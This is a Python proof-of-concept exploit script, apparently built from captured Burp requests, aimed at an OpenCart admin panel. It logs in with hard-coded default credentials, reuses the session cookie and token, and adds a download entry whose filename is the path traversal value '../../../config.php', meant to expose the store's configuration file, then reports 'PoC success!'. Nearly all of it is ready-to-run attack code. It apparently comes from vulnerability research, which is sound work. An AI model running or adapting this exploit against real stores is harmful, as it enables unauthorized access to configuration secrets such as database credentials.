import requests
import urllib3
requests.packages.urllib3.disable_warnings()
host = "opencart22"

def loginad():
    session = requests.session()
    burp0_url = "https://"+host+":443/admin/index.php?route=common/login"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept-Encoding": "gzip, deflate", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Connection": "close", "Cache-Control": "max-age=0", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "Content-Type": "multipart/form-data; boundary=---------------------------7e41da1a409b4", "Upgrade-Insecure-Requests": "1"}
    burp0_data = "-----------------------------7e41da1a409b4\r\nContent-Disposition: form-data; name=\"username\"\r\n\r\nuser\r\n-----------------------------7e41da1a409b4\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\nbitnami1\r\n-----------------------------7e41da1a409b4--\r\n"
    res=session.post(burp0_url, headers=burp0_headers, data=burp0_data,allow_redirects=False,verify=False)
    location=res.headers['location']
    cookies=res.cookies['OCSESSID']
    token=location[-32:]
    #print(cookies)
    #print(token)
    return  cookies,token,session
    # r=requests.post(burp0_url, headers=burp0_headers,  data=burp0_data,verify=False)
#cookies=r.cookies.get_dict()

#cookie
   #  cookies=r.cookies['OCSESSID']

#token
#    session = requests.Session()
#    res = session.post(burp0_url, headers=burp0_headers,  data=burp0_data,verify=False, allow_redirects=False)
#    location=res.headers['location']
#    cookies=res.cookies['OCSESSID']
#    token=location[-32:]
     
   #print(cookies)
   #print(token)
#    return {
#     'cookies': cookies,
#     'token': token
#      }


def addfile(adcookies,adtoken):
    session = requests.session()
    burp0_url = "https://"+host+":443/admin/index.php?route=catalog/download/add&user_token="+adtoken
    burp0_cookies = {"OCSESSID": adcookies}
    burp0_headers = {"Referer": "https://"+host+"/admin/index.php?route=catalog/download/add&user_token="+adtoken, "Cache-Control": "max-age=0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "Content-Type": "multipart/form-data; boundary=---------------------------7e4812b409b4", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
    burp0_data = "-----------------------------7e4812b409b4\r\nContent-Disposition: form-data; name=\"download_description[1][name]\"\r\n\r\nfile_poc_2020\r\n-----------------------------7e4812b409b4\r\nContent-Disposition: form-data; name=\"filename\"\r\n\r\n../../../config.php\r\n-----------------------------7e4812b409b4\r\nContent-Disposition: form-data; name=\"mask\"\r\n\r\n1234\r\n-----------------------------7e4812b409b4--\r\n"
    session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,allow_redirects=False,verify=False)
    
    burp0_url = "https://"+host+":443/admin/index.php?route=catalog/download&user_token="+adtoken
    r_check=session.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,allow_redirects=False,verify=False)
    print("add download file")
    #print(r_check.text)
    return r_check
    #print(r.status_code)
    #print(r.text)
   

def check_poc(r_check):
    if("file_poc_2020" in r_check.text):
        print('PoC success!')
        return 0
    else:
        print('PoC failed!')
        return -1


if __name__ == "__main__":
    n=loginad()
    adcookies=n[0]
    adtoken=n[1] 
    session=n[2]
    r_check=addfile(adcookies,adtoken)
  
    result=check_poc(r_check)
    exit(result)
    
 






